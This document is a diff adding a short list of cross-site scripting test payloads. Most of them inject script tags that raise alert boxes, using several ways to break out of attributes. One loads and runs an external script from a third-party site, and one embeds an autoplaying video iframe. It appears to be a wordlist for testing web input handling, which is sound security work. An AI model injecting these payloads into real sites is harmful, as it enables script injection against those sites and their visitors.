@@ -1,0 +1,13 @@
+]} <script>alert(1)</script>
+
+<script>alert(1)</script>
+
+><script>alert('Vulnerable')</script><b a=a
+
+a></a><script>alert('Vulnerable')</script>
+
+\'><script>alert%28\'Vulnerable\'%29</script><
+
+<script type="text/javascript" src="http://www.cornify.com/js/cornify.js" onLoad="cornify_add();return false"></script>
+
+<iframe src="http://www.youtube.com/v/60og9gwKh1o&hl=en&fs=1&autoplay=1"></iframe>
